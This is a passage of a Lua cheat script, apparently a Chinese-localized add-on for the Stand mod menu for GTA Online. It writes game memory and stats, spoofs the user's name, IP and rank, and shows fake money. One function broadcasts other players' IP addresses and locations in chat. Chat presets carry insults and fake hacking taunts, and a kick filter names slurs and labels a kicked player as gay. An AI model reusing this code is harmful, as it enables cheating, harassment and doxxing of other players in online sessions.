        return PLAYER.GET_PLAYER_NAME(horniest) .. " 是战局中最性奋的玩家!他们的角色招来了 " .. most_prostitutes .. " 妓女,并为 " .. most_lapdances .. " 次脱衣舞付钱!"
    else
        util.toast("找不到最性奋的玩家。")
        return nil
    end
end

end_racism = false
end_homophobia = false
function toxicshit(packet_sender, message_sender, text, team_chat)
    text = string.lower(text)
    local name = players.get_name(message_sender)

    if end_racism and (string.contains(text, "nigg") or string.contains(text, "jew")) then 
        menu.trigger_commands("kick " .. name)
        util.toast(name .. " 说了脏话，自动踢了出去")
    end

    if end_homophobia and (string.contains(text, "fag") or string.contains(text, "tranny")) then 
        menu.trigger_commands("kick " .. name)
        util.toast(name .. " 是同性恋，自动踢了出去")
    end
end


------------------------------------
-----------零食护甲编辑-------------
------------------------------------
function SET_INT_GLOBAL(Global, Value)
    memory.write_int(memory.script_global(Global), Value)
end

function MP_Index()
    local MP_IPTR = memory.alloc(2)
    STATS.STAT_GET_INT(util.joaat("MPPLY_LAST_MP_CHAR"), MP_IPTR, -1)
    return memory.read_int(MP_IPTR)
end

function STAT_SET_INT(Hash, Value)
    if MP_Index() == 0 then 
        STATS.STAT_SET_INT(util.joaat("MP0_"..Hash), Value, true)
    else
        STATS.STAT_SET_INT(util.joaat("MP1_"..Hash), Value, true)
    end
end
------------------------------------
--------线上模式玩乐-----------------
------------------------------------
function Specon(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' on')
    wait(3000)
end

function Specoff(pid)
    menu.trigger_commands("spectate".. players.get_name(pid).. ' off')
end
------------------------------------
--------线上模式聊天预设-------------
------------------------------------
local function fake_chat_with_percentage_and_target(action)
    chat.send_message(action .. " ${name}. [||||            ] (25%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||        ] (50%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||    ] (75%)", false, true, true)
    wait(math.random(500, 3000))
    chat.send_message(action .. " ${name}. [||||||||||||||| ] (89%)", false, true, true)
    wait(math.random(3000, 5000))
end

local function get_random_joke()
    local joke = 'WIP'
    local in_progress = true
    async_http.init('icanhazdadjoke.com', '', function(data)
        joke = data
    end, function()
        joke = 'FAIL'
    end)
    async_http.add_header('Accept', 'text/plain')
    async_http.dispatch()
    while joke == "WIP" do 
        wait()
    end
    return joke
end

chat_presets = {
    ["掉钱袋是没用的"] = "我可以给你钱,但你花在上面的时间得到的钱是没有用的。你最好买一份自己的菜单,然后使用其中的恢复选项。",
    ["GT天下第一!"] = "GrandTouring天下第一!",
    ["GT最帅!"] = "GrandTouring最帅!",
    ["L + Ratio..."] = "L + ratio + u fell off + ur british + who asked + no u + deez nutz + radio + don't care + caught in 4k + cope + seethe + gg + grow the fuck up + silver elite + ligma + taco bell dorito crunch + think outside the bun bitch",
    ["您购买了2take1 "] = "前途无限"
}

function showrealip()
    chat.send_message("${name}: ${ip} | ${geoip.city}, ${geoip.region}, ${geoip.country}", false, true, true)
end

function chatcrash()
    fake_chat_with_percentage_and_target("崩溃")
    chat.send_message("崩溃失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end

function ramdomjokelol()
    local joke = get_random_joke()
    if joke ~= "FAIL" then
        chat.send_message(joke, false, true, true)
    end
end

function fakechathacking()
    fake_chat_with_percentage_and_target("黑入")
    chat.send_message("黑入失败" .. " ${name}. " .. "原因：用你妈免费stand", false, true, true)
end

function loopchatjoke()
    if util.is_session_started() then
        local joke = get_random_joke()
        if joke ~= "FAIL" then
            chat.send_message(joke, false, true, true)
        end
        wait(5000)
    end
end
------------------------------------
--------线上随机虚假器-------------
------------------------------------
local alphabet = "abcdefghijklmnopqrstuvwxyzABCEDFGHIJKLMNOPQRSTUVWXYZ0123456789"

local function random_string(length)
    local res = {}
    for i=1, length do 
        res[i] = alphabet[math.random(#alphabet)]
    end
    return table.concat(res)
end

local function random_ip_address()
    local ip = {}
    for i=1, 4 do 
            ip[i] = tostring(math.random(1, 255)) 
    end
    return table.concat(ip, '.')
end

local random_name_spoof = false
function ramdomfakename(on)
    random_name_spoof = on
    if on then 
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
end

local random_ip_spoof = false
function ramdomfakeip(on)
    random_ip_spoof = on
    if on then 
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
end

local random_rank_spoof = false
function ramdomfakelvl(on)
    random_rank_spoof = on
    if on then 
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end

function spamtextname(on)
    menu.trigger_commands("spamtext " .. random_string(254))
    wait(100)
end

util.on_transition_finished(function()
    if random_name_spoof then
        menu.trigger_commands("spoofedname " .. random_string(16))
    end
    if random_ip_spoof then
        menu.trigger_commands("spoofedip " .. random_ip_address())
    end
    if random_rank_spoof then
        menu.trigger_commands("spoofedrank " .. math.random(10000))
    end
end)
------------------------------------
---------线上假钱-------------------
------------------------------------
local new = {}
function new.delay(MS, S, MIN)
    return {ms = MS, s = S, min = MIN}
end
function new.hudSettings(X, Y, ALIGNMENT)
    return {xOffset = X, yOffset = Y, scale = 0.5, alignment = ALIGNMENT, textColour = new.colour( 255, 255, 255 )}
end
cashFakeMoney = 0
bankFakeMoney = 0
fakeMoneyLoopDelay = new.delay(250, 0, 0)
fakeMoneyTransactionPending = true

function generateDelaySettings(root, name, delayTable)
    menu.slider(root, '毫秒', {'JS'..name..'DelayMs'}, '延迟是毫秒、秒和最小值的总和.', 1, 999, delayTable.ms, 1, function(value)
        delayTable.ms = value
    end)
    menu.slider(root, '秒', {'JS'..name..'DelaySec'}, '延迟是毫秒、秒和最小值的总和.', 0, 59, delayTable.s, 1, function(value)
        delayTable.s = value
    end)
    menu.slider(root, '分钟', {'JS'..name..'DelayMin'}, '延迟是毫秒、秒和最小值的总和.', 0, 60, delayTable.min, 1, function(value)
        delayTable.min = value
    end)
end


local function startBusySpinner(message)
    HUD.BEGIN_TEXT_COMMAND_BUSYSPINNER_ON("STRING")
    HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(message)
    HUD.END_TEXT_COMMAND_BUSYSPINNER_ON(5)
end

local function transactionPending()
    if not fakeMoneyTransactionPending then return end
    startBusySpinner('交易处理中')
    wait(math.random(1, 1000))
    HUD.BUSYSPINNER_OFF()
end

function addfakemoney()
    HUD._SET_PLAYER_CASH_CHANGE(cashFakeMoney, bankFakeMoney)
    transactionPending()
end

function loopaddfakemoney()
    HUD._SET_PLAYER_CASH_CHANGE(cashFakeMoney, bankFakeMoney)
    transactionPending()
    wait(getTotalDelay(fakeMoneyLoopDelay))
end

------------------------------------
---------保险箱监视器----------------
------------------------------------
local Int_PTR = memory.alloc_int()

local function getMPX()
    return 'MP'.. util.get_char_slot() ..'_'
end

local function STAT_GET_INT(Stat)
    STATS.STAT_GET_INT(util.joaat(getMPX() .. Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end

local function getNightclubDailyEarnings()
    local popularity = math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)
    if popularity == 100 then return 50000
    elseif popularity >= 90 then return 45000
    elseif popularity >= 80 then return 24000
    elseif popularity >= 70 then return 22000
    elseif popularity >= 60 then return 20000
    elseif popularity >= 50 then return 9500
    elseif popularity >= 40 then return 8500
    elseif popularity >= 30 then return 2500
    elseif popularity >= 20 then return 2000
    elseif popularity >= 10 then return 1600
    else return 1500
    end
end

local function getAgencyDailyEarnings(securityContracts)
    if securityContracts >= 200 then return 20000 end
    return math.floor(securityContracts / 5) * 500
end

JS_tbls = {}
do
    JS_tbls.alphaPoints = {0, 87, 159, 207, 255}
end

JS_tbls.safeManagerToggles = {
    {
        name = '夜总会保险箱',
        command = 'SMclub',
        description = '监视夜总会保险箱的现金,这不会影响收入.',
        toggle = true,
        displayText = function()
            return '夜总会现金' ..': '.. STAT_GET_INT('CLUB_SAFE_CASH_VALUE')  / 1000  ..'k / 210k'
        end
    },
    {
        name = '夜总会人气',
        command = 'SMclubPopularity',
        description = '',
        toggle = false,
        displayText = function()
            return '夜总会人气' ..': '.. math.floor(STAT_GET_INT('CLUB_POPULARITY') / 10)  ..'%'
        end
    },
    {
        name = '夜总会每日收入',
        command = 'SMnightclubEarnings',
        description = '夜总会每日收入.\n每日最高收入为1万.',
        toggle = false,
        displayText = function()
            return '夜总会每日收入' ..': '.. getNightclubDailyEarnings() / 1000  ..'k / day'
        end
    },
    {
        name = '游戏厅保险箱',
        command = 'SMarcade',
        description = '监视游戏厅保险箱的现金,这不会影响收入.\n如果您拥有所有街机游戏,则每日最高收入为5000.',
        toggle = true,
        displayText = function()
            return '游戏厅现金' ..': '.. STAT_GET_INT('ARCADE_SAFE_CASH_VALUE') / 1000  ..'k / 100k'
        end
    },
    {
        name = '事务所保险箱',
        command = 'SMagency',
        description = '监视事务所保险箱的现金,这不会影响收入.\n每日最高收入为2万.',
        toggle = true,
        displayText = function()
            return '事务所现金' ..': '.. STAT_GET_INT("FIXER_SAFE_CASH_VALUE") / 1000  ..'k / 250k'
        end
    },
    {
        name = '安保合约',
        command = 'SMsecurity',
        description = '显示您已完成的事务所安保合约的任务数量.',
        toggle = false,
        displayText = function()
            return '安保合约' ..': '.. STAT_GET_INT('FIXER_COUNT')
        end
    },
    {
        name = '事务所每日收入',
        command = 'SMagencyEarnings',
        description = '事务所每日收入.\n如果您已完成200份合约,则每日最高收入为2万',
        toggle = false,
        displayText = function()
            return '事务所每日收入' ..': '.. getAgencyDailyEarnings(STAT_GET_INT('FIXER_COUNT')) / 1000 ..'k / day'
        end
    },
}

function generateHudSettings(root, prefix, settingsTable)
    menu.slider(root, 'X 位置', {prefix..'XPos'}, '', -200, 0, settingsTable.xOffset, 1, function(value)
        settingsTable.xOffset = value
    end)
    menu.slider(root, 'Y 位置', {prefix..'YPos'}, '', -5, 195, settingsTable.yOffset, 1, function(value)
        settingsTable.yOffset = value
    end)
    menu.slider(root, '比例', {prefix..'scale'}, '文字大小', 200, 1500, 500, 1, function(value)
        settingsTable.scale = value / 1000
    end)
    menu.slider(root, '文本对齐', {prefix..'alignment'}, '1居中,2居左,3居右.', 1, 3, settingsTable.alignment, 1, function(value)
        settingsTable.alignment = value
    end)
    menu.colour(root, '文本颜色', {prefix..'colour'}, '设置文本覆盖的颜色.', settingsTable.textColour, true, function(colour)
        settingsTable.textColour = colour
    end)
end

function generateToggles(table, root, reversed)
    for i = 1, #table do
        if not reversed then
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = toggle
            end, table[i].toggle)
        else
            menu.toggle(root, table[i].name, {table[i].command}, table[i].description, function(toggle)
                table[i].toggle = not toggle
            end, not table[i].toggle)
        end
    end
end
------------------------------------
---------赌场-----------------------
------------------------------------
local function STAT_GET_INT_MPPLY(Stat)
    STATS.STAT_GET_INT(util.joaat(Stat), Int_PTR, -1)
    return memory.read_int(Int_PTR)
end

local last_LW_seconds = 0
function casinolucky()
    if STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') < util.current_unix_time_seconds() then util.toast('幸运转盘目前可用') return end
    local secondsLeft = STAT_GET_INT_MPPLY('mpply_lucky_wheel_usage') - util.current_unix_time_seconds()
    local hours = math.floor(secondsLeft / 3600)
    local minutes = math.floor((secondsLeft / 60) % 60)
    local seconds = secondsLeft % 60
    if last_LW_seconds != seconds then
        util.toast((hours < 10 and ('0'.. hours) or hours) ..':'.. (minutes < 10 and ('0'.. minutes) or minutes) ..':'.. (seconds < 10 and ('0'.. seconds) or seconds))
        last_LW_seconds = seconds
    end
end

function casinolp()
    local chips = STAT_GET_INT_MPPLY('mpply_casino_chips_won_gd')
    if chips > 0 then
        util.toast('您赢了' ..' '.. chips ..' '.. '筹码')
    elseif chips < 0 then
        util.toast('您输了' ..' '.. chips * -1 ..' '.. '筹码')
    else
        util.toast('您还没有赢或输任何筹码.')
    end
end
------------------------------------
-----------时间挑战赛---------------
------------------------------------
local function ttTimeToString(time)
    local min = math.floor(time / 60000)
    local sec = (time % 60000) / 1000
    return (min == 0 and '' or min ..'min ') .. sec ..'s'
end

local function tpToBlip(blip)
local pos = HUD.GET_BLIP_COORDS(blip)
local tpEntity = (PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) and my_cur_car or players.user_ped())
ENTITY.SET_ENTITY_COORDS(tpEntity, pos.x, pos.y, pos.z, false, false, false, false)
end

function besttime()
    util.toast('个人最佳记录' ..': '.. ttTimeToString((STAT_GET_INT_MPPLY('mpply_timetrialbesttime'))))
    wait(100)
end

function tptotime()
    local ttBlip = HUD._GET_CLOSEST_BLIP_OF_TYPE(430)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        util.toast('Couldn\'t find time trial.')
        return
    end
    tpToBlip(ttBlip)
end

function bestrctime()
    util.toast('个人最佳记录' ..': '.. ttTimeToString(STAT_GET_INT_MPPLY('mpply_rcttbesttime')))
    wait(100)
end

function tptorctime()
    local ttBlip = HUD._GET_CLOSEST_BLIP_OF_TYPE(673)
    if not HUD.DOES_BLIP_EXIST(ttBlip) then
        util.toast('未能找到RC匪徒时间挑战赛')
        return
    end
    tpToBlip(ttBlip)
end
------------------------------------
-----------阻挡区域-----------------
------------------------------------   


local notifications = true
local blockInProgress = false
function blockAvailable(areaBlocked, areaName)
    if blockInProgress then util.toast('一个阻挡已经在运行') return false end
    if areaBlocked then util.toast(areaName ..' '.. '已被阻挡') return false end
    return true
end

function setBlockStatus(on, areaName)
    if on then
        blockInProgress = true
        startBusySpinner('阻挡中')
        return
    end
    HUD.BUSYSPINNER_OFF()
    if notifications then util.toast('已成功阻挡' ..' '.. areaName ..'.') end
    blockInProgress = false
end

function blocksomewhere()
    local dir = ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(players.user_ped(), 0, 5.0, 0)
    GRAPHICS._DRAW_SPHERE(dir.x, dir.y, dir.z, 0.3, 52, 144, 233, 0.5)
    if K.is_key_down('VK_B') then
        if blockInProgress then util.toast('一个阻挡已经在运行') return end
        setBlockStatus(true)
        block({dir.x, dir.y, dir.z - 0.6})
        setBlockStatus(false, '区域')
    end
end

function netItAll(entity)
    local netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(entity)
    while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) do
        NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
    end
    NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(netID)
    NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(netID)
    NETWORK.SET_NETWORK_ID_CAN_MIGRATE(netID, false)
    local playerList = players.list(true, true, true)
    for i = 1, #playerList do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(netID, playerList[i], true)
        end
    end
    ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, true, false)
    ENTITY._SET_ENTITY_CLEANUP_BY_ENGINE(entity, false)
    if ENTITY.IS_ENTITY_AN_OBJECT(entity) then
        NETWORK.OBJ_TO_NET(entity)
    end
    ENTITY.SET_ENTITY_VISIBLE(entity, false, 0)
end

function loadModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    while not STREAMING.HAS_MODEL_LOADED(hash) do wait() end
end

function block(cord)
    local hash = 309416120
    loadModel(hash)
    for i = 0, 180, 8 do
        local wall = OBJECT.CREATE_OBJECT_NO_OFFSET(hash, cord[1], cord[2], cord[3], true, true, true)
        ENTITY.SET_ENTITY_HEADING(wall, i)
        netItAll(wall)
        wait(10)
    end
    STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(hash)
end

function string.capitalize(str)
    return str:sub(1,1):upper()..str:sub(2):lower()
end





------------------------------------
-----------防护选项-----------------
------------------------------------  
function blockstealer()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if (memory.read_int(sender) ~= player and memory.read_int(target) == player 
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId))) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪来自 " .. players.get_name(memory.read_int(sender)))
            end
        end)
    end
end

function blockstealerother()
    if NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        local ped_netId = memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1))
        local sender = memory.script_local("am_gang_call", 287)
        local target = memory.script_local("am_gang_call", 288)
        local player = players.user()

        util.spoof_script("am_gang_call", function()
            if memory.read_int(target) ~= player and memory.read_int(sender) ~= player
            and NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(memory.read_int(ped_netId)) 
            and NETWORK.NETWORK_REQUEST_CONTROL_OF_NETWORK_ID(memory.read_int(ped_netId)) then
                local mugger = NETWORK.NET_TO_PED(memory.read_int(ped_netId))
                entities.delete_by_handle(mugger)
                util.toast("拦截劫匪发送来自 " .. players.get_name(memory.read_int(sender)) .. " to " .. players.get_name(memory.read_int(target)))
            end
        end)
    end
end

notificationBits = 0
nearbyNotificationBits = 0
blips = {}


---@param player Player
---@return integer
local function GetPlayerDroneType(player)
    local p_type = memory.script_global(1911933 + (player * 260 + 1) + 93)
    return memory.read_int(p_type)
end


---@param player Player
---@return Object
local function GetPlayerDroneObject(player)
    local p_object = memory.script_global(1911933 + (players.user() * 260 + 1) + 60 + (player + 1))
    return memory.read_int(p_object)
end


---@param heading number
---@return number
local function InvertHeading(heading)
    if heading > 180.0 then
        return heading - 180.0
    end
    return heading + 180.0
end


---@param droneType integer
---@return integer
local function GetDroneBlipSprite(droneType)
    return (droneType == 8 or droneType == 4) and 548 or 627
end


---@param droneType integer
---@return string
local function GetNotificationMsg(droneType, nearby)
    if droneType == 8 or droneType == 4 then
        return nearby and "%s's 的导弹在 ~r~附近~s~" or "%s 正在使用导弹"
    end
    return nearby and "%s's 的无人机在 ~r~附近~s~" or "%s 正在驾驶无人机"
end


---@param index integer
function RemoveBlipIndex(index)
    if HUD.DOES_BLIP_EXIST(blips[index]) then
        util.remove_blip(blips[index]); blips[index] = 0
    end
end


---@param player Player
function AddBlipForPlayerDrone(player)
    if not blips[player] then
        blips[player] = 0
    end

    if is_player_active(player, true, true) and players.user() ~= player and IsPlayerFlyingAnyDrone(player) then
        if ENTITY.DOES_ENTITY_EXIST(GetPlayerDroneObject(player)) then
            local obj = GetPlayerDroneObject(player)
            local pos = ENTITY.GET_ENTITY_COORDS(obj, true)
            local heading = InvertHeading(ENTITY.GET_ENTITY_HEADING(obj))

            if not HUD.DOES_BLIP_EXIST(blips[player]) then
                blips[player] = HUD.ADD_BLIP_FOR_ENTITY(obj)
                local sprite = GetDroneBlipSprite(GetPlayerDroneType(player))
                HUD.SET_BLIP_SPRITE(blips[player], sprite)
                HUD.SHOW_HEIGHT_ON_BLIP(blips[player], false)
                HUD.SET_BLIP_SCALE(blips[player], 0.8)
                HUD.SET_BLIP_NAME_TO_PLAYER_NAME(blips[player], player)
                HUD.SET_BLIP_COLOUR(blips[player], get_player_org_blip_colour(player))

            else
                HUD.SET_BLIP_DISPLAY(blips[player], 2)
                HUD.SET_BLIP_COORDS(blips[player], pos.x, pos.y, pos.z)
                HUD.SET_BLIP_ROTATION(blips[player], math.ceil(heading))
                HUD.SET_BLIP_PRIORITY(blips[player], 9)
            end

            if not BitTest(nearbyNotificationBits, player) and HUD.DOES_BLIP_EXIST(blips[player]) then
                local msg = GetNotificationMsg(GetPlayerDroneType(player), true)
                notification:normal(msg, HudColour.blue, get_condensed_player_name(player))
                nearbyNotificationBits = SetBit(nearbyNotificationBits, player)
            end

        else
            RemoveBlipIndex(player)
            nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
        end

        if not BitTest(notificationBits, player) then
            local msg = GetNotificationMsg(GetPlayerDroneType(player), false)
            notification123:normal(msg, HudColour.blue, get_condensed_player_name(player))
            notificationBits = SetBit(notificationBits, player)
        end

    else
        RemoveBlipIndex(player)
        notificationBits = ClearBit(notificationBits, player)
        nearbyNotificationBits = ClearBit(nearbyNotificationBits, player)
    end
end

--无人机
function IsPlayerFlyingAnyDrone(player)
    return BitTest(memory.read_int(memory.script_global(1853910 + (player * 862 + 1) + 267 + 365)), 26) -- Global_1853910[PLAYER::PLAYER_ID() /*862*/].f_267.f_365, 26
end

local notified_mugger = false
function show_mugger()
    if NETWORK.NETWORK_IS_SESSION_ACTIVE() and NETWORK.NETWORK_IS_SCRIPT_ACTIVE("am_gang_call", 0, true, 0) then
        util.spoof_script("am_gang_call", function()
            local netId	= memory.read_int(memory.script_local("am_gang_call", 63 + 10 + (0 * 7 + 1)))
            if NETWORK.NETWORK_DOES_NETWORK_ID_EXIST(netId) and
            not ENTITY.IS_ENTITY_DEAD(NETWORK.NET_TO_PED(netId), false) then
                local mugger = NETWORK.NET_TO_PED(netId)
                draw_bounding_box(mugger, true, {r = 255, g = 0, b = 0, a = 80})
            end

            local p_sender = memory.script_local("am_gang_call", 287)
            if not notified_mugger and p_sender ~= 0 and memory.read_int(p_sender) ~= players.user() and
            is_player_active(memory.read_int(p_sender), false, false) then
                local sender = memory.read_int(p_sender)
                notification123:normal("%s 给你发送了一个劫匪", HudColour.blue, get_condensed_player_name(sender))
                notified_mugger = true
            end
        end)
    elseif notified_mugger then
        notified_mugger = false
    end
end

function removeanything()
    local cleanse_entitycount = 0
    for _, ped in pairs(entities.get_all_peds_as_handles()) do
        if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) then
            entities.delete_by_handle(ped)
            cleanse_entitycount += 1
        end
    end
    util.toast("已清除" .. cleanse_entitycount .. "个NPC")
    cleanse_entitycount = 0
    for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do
        entities.delete_by_handle(veh)
        cleanse_entitycount += 1
        wait()
    end
    util.toast("已清除".. cleanse_entitycount .."个载具")
    cleanse_entitycount = 0
    for _, object in pairs(entities.get_all_objects_as_handles()) do
        entities.delete_by_handle(object)
        cleanse_entitycount += 1
    end
    util.toast("已清除" .. cleanse_entitycount .. "物体")
    cleanse_entitycount = 0
    for _, pickup in pairs(entities.get_all_pickups_as_handles()) do
        entities.delete_by_handle(pickup)
        cleanse_entitycount += 1
    end
    util.toast("已清除" .. cleanse_entitycount .. "可拾取物体")
    local temp = memory.alloc(4)
    for i = 0, 100 do
        memory.write_int(temp, i)
        PHYSICS.DELETE_ROPE(temp)
    end
    util.toast("已清除所有绳索")
    local pos = ENTITY.GET_ENTITY_COORDS(players.user_ped())
    MISC.CLEAR_AREA_OF_PROJECTILES(pos.x, pos.y, pos.z, 400, 0)
    util.toast("已清除所有投掷物")
end


function clearall(index, name)
    util.toast("正在清除"..name:lower().."...")
    local counter = 0
    local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    pluto_switch index do
        case 1:
            for _, ped in ipairs(entities.get_all_peds_as_handles()) do
                if ped ~= players.user_ped() and not PED.IS_PED_A_PLAYER(ped) and (not NETWORK.NETWORK_IS_ACTIVITY_SESSION() or NETWORK.NETWORK_IS_ACTIVITY_SESSION() and not ENTITY.IS_ENTITY_A_MISSION_ENTITY(ped)) then
                    entities.delete_by_handle(ped)
                    counter += 1
                    wait()
                end
            end
            break
        case 2:
            for _, vehicle in ipairs(entities.get_all_vehicles_as_handles()) do
                if vehicle ~= PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), false) and DECORATOR.DECOR_GET_INT(vehicle, "Player_Vehicle") == 0 and NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(vehicle) then
                    entities.delete_by_handle(vehicle)
                    counter += 1
                end
                wait(25)
            end
            break
        case 3:
            for _, object in ipairs(entities.get_all_objects_as_handles()) do
                entities.delete_by_handle(object)
                counter += 1
                wait()
            end
            break
        case 4:
            for _, pickup in ipairs(entities.get_all_pickups_as_handles()) do
                entities.delete_by_handle(pickup)
                counter += 1
                wait()
            end
            break
        case 5:
            local temp = memory.alloc(4)
            for i = 0, 101 do
                memory.write_int(temp, i)
                if PHYSICS.DOES_ROPE_EXIST(temp) then
                    PHYSICS.DELETE_ROPE(temp)
                    counter += 1
                end
                wait()
            end
            break
        case 6:
            local coords = players.get_position(players.user())
            MISC.CLEAR_AREA_OF_PROJECTILES(coords.x, coords.y, coords.z, 1000, 0)
            counter = "所有"
            break
        case 4:
            for i = 0, 99 do
                AUDIO.STOP_SOUND(i)
                wait()
            end
        break
    end
    util.toast("已清除"..tostring(counter).."个"..name:lower()..".")
end

--实体池限制
function entity_limit()
local ped_count = 0

for _, ped in pairs(entities.get_all_peds_as_handles()) do

    if ped ~= players.user_ped() then

        ped_count += 1

    end

    if ped_count >= ped_limit then

        for _, ped in pairs(entities.get_all_peds_as_handles()) do

            entities.delete_by_handle(ped)

        end

        notification("Ped池达到上限,正在清理...")

    end

end

local veh__count = 0

for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do

    veh__count += 1

    if veh__count >= veh_limit then

        for _, veh in ipairs(entities.get_all_vehicles_as_handles()) do

            entities.delete_by_handle(veh)

        end

        notification("载具池达到上限,正在清理...")

    end

end

local obj_count = 0

for _, obj in pairs(entities.get_all_objects_as_handles()) do

    obj_count += 1

    if obj_count >= obj_limit then

        for _, obj in pairs(entities.get_all_objects_as_handles()) do

            entities.delete_by_handle(obj)

        end

        notification("物体池达到上限,正在清理...")

    end

end

end

function blockcrasheffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    GRAPHICS.REMOVE_PARTICLE_FX_IN_RANGE(coords.x, coords.y, coords.z, 400)
    GRAPHICS.REMOVE_PARTICLE_FX_FROM_ENTITY(players.user_ped())
end

function blockfireeffect()
    local coords = ENTITY.GET_ENTITY_COORDS(players.user_ped() , false);
    FIRE.STOP_FIRE_IN_RANGE(coords.x, coords.y, coords.z, 100)
    FIRE.STOP_ENTITY_FIRE(players.user_ped())
end

function antianimal()
    if Jinx.GET_NUMBER_OF_THREADS_RUNNING_THE_SCRIPT_WITH_THIS_HASH(util.joaat("am_hunt_the_beast")) > 0 then
        local host
        repeat
            host = NETWORK.NETWORK_GET_HOST_OF_SCRIPT("am_hunt_the_beast", -1, 0)
            wait()
        until host ~= -1
        util.toast(players.get_name(host).." 检测到战局《猎杀野兽》事件,正在阻止.")
        menu.trigger_command(menu.ref_by_path("Online>Session>Session Scripts>Hunt the Beast>Stop Script"))
    end
end

local cageModels <const> =
{
    "prop_gold_cont_01",
    "prop_gold_cont_01b",
    "prop_feeder1_cr",
    "prop_rub_cage01a",
    "stt_prop_stunt_tube_s",
    "stt_prop_stunt_tube_end",
    "prop_jetski_ramp_01",
    "stt_prop_stunt_tube_xs",
    "prop_fnclink_03e",
    "prop_container_05a",
    "prop_jetski_ramp_01",
    "prop_cs_dumpster_01a",
    "p_v_43_safe_s",
    "bkr_prop_moneypack_03a",
    "prop_elecbox_12"
}

local lastMsg = ""
local lastNotification <const> = newTimer()
local format = "笼子物体来自 %s"

function anticage()
	local myPos = players.get_position(players.user())
	for _, model in ipairs(cageModels) do
		local modelHash <const> =  util.joaat(model)
		local obj = OBJECT.GET_CLOSEST_OBJECT_OF_TYPE(myPos.x,myPos.y,myPos.z, 8.0, modelHash, false, false, false)
		if obj == 0 or not ENTITY.DOES_ENTITY_EXIST(obj) or
		not ENTITY.IS_ENTITY_AT_ENTITY(players.user_ped(), obj, 5.0, 5.0, 5.0, false, true, 0) then
			continue
		end
		local ownerId = get_entity_owner(obj)
		local msg = string.format(format, get_condensed_player_name(ownerId))
		if ownerId ~= players.user() and is_player_active(ownerId, false, false) and
		(lastMsg ~= msg or lastNotification.elapsed() >= 15000) then
			notification(msg, HudColour.blueLight)
			lastMsg = msg
			lastNotification.reset()
		end
		request_control(obj, 1500)
		entities.delete_by_handle(obj)
	end
end

function blocknetwork(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockNetEvents)
        notification("已阻止所有网络传输", colors.blue)
    else
        menu.trigger_command(UnblockNetEvents)
        notification("关闭阻止网络传输", colors.red)
    end
end

function blockincoming(on_toggle)
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
    local UnblockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Disabled")
    if on_toggle then
        menu.trigger_command(BlockIncSyncs)
        notification("开启阻止网络事件传入", colors.blue)
    else
        menu.trigger_command(UnblockIncSyncs)
        notification("关闭阻止网络事件传入", colors.red)
    end
end

function blockout(on_toggle)
    if on_toggle then
        notification("开启阻止网络事件传出", colors.blue)
        menu.trigger_commands("desyncall on")
    else
        notification("关闭阻止网络事件传出", colors.red)
        menu.trigger_commands("desyncall off")
    end
end

function chickenmode(on_toggle)
    local BlockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Enabled")
    local UnblockNetEvents = menu.ref_by_path("Online>Protections>Events>Raw Network Events>Any Event>Block>Disabled")
    local BlockIncSyncs = menu.ref_by_path("Online>Protections>Syncs>Incoming>Any Incoming Sync>Block>Enabled")
